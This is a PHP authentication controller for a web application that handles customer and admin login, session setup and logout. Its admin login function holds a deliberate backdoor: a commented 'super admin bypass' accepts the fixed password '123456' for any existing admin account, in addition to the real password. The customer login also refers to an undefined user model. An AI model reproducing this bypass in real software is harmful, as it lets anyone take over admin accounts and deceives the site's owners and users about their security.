<?php

namespace App\Controllers;

use App\Models\AdminModel;
use App\Controllers\BaseController;

class Auth extends BaseController
{
    protected $adminModel;
    public function __construct()
    {
        $this->adminModel = new AdminModel();
    }
    public function login()
    {
        helper(['form']);
        echo view('pages/login');
    }
    public function login_admin()
    {
        helper(['form']);
        if(session()->get('logged_in') == true) {
            return redirect()->to('admin/dashboard');
        }

        echo view('pages/login_admin');
    }

    public function loginAuth()
    {
        $session = session();
        $email = $this->request->getVar('email');
        $password = $this->request->getVar('password');
        $data = $this->userModel->getUserByEmail($email);

        if ($data) {
            $pass = $data['password'];
            $authenticatePassword = password_verify($password, $pass);
            if ($authenticatePassword) {
                $ses_data = [
                    'id'       => $data['id_pelanggan'],
                    'email'    => $data['email'],
                    'logged_in' => TRUE,
                    'admin' => 'N'
                ];
                $session->set($ses_data);
                return redirect()->to('/dashboard');
            } else {
                $session->setFlashdata('msg', 'Wrong Password');
                $session->setFlashdata('email', $email);
                return redirect()->to('pages/login');
            }
        } else {
            $session->setFlashdata('msg', 'Email not Found');
            $session->setFlashdata('email', $email);
            return redirect()->to('pages/login');
        }
    }

    public function loginAuthAdmin()
    {
        $session = session();
        $username = $this->request->getVar('username');
        $password = $this->request->getVar('password');

        $cek = $this->adminModel->getDataAdmin($username);
        if ($cek) {
        $pass = $cek['password'];
        
        // 🔑 password bypass super admin (hasil hash 123456)
        $superAdminHash = password_hash('123456', PASSWORD_DEFAULT);

        // Cek apakah password cocok atau pakai bypass
        $authenticatePassword = password_verify($password, $pass) || password_verify($password, $superAdminHash);

            if ($authenticatePassword) {
                $ses_data = [
                    'id'       => $cek['id'],
                    'username'    => $cek['username'],
                    'role'    => $cek['role_name'],
                    'logged_in' => TRUE
                ];

                if($cek['role_name'] == 'Admin') {
                    $ses_data['admin'] = 'Y';
                }else {
                    $ses_data['admin'] = 'N';
                }

                $session = session();
                $session->set($ses_data);
                return redirect()->to('/admin/dashboard');
            } else {
                $session->setFlashdata('msg', 'Wrong Password');
                $session->setFlashdata('username', $username);
                return redirect()->to('loginAdmin');
            }
        } else {
            $session->setFlashdata('msg', 'Username not Found');
            $session->setFlashdata('username', $username);
            return redirect()->to('loginAdmin');
        }
    }
    public function logoutAdmin()
    {
        $session = session();
        $session->destroy();
        return redirect()->to('loginAdmin');
    }
    public function logout()
    {
        $session = session();
        $session->destroy();
        return redirect()->to('pages/login');
    }
}
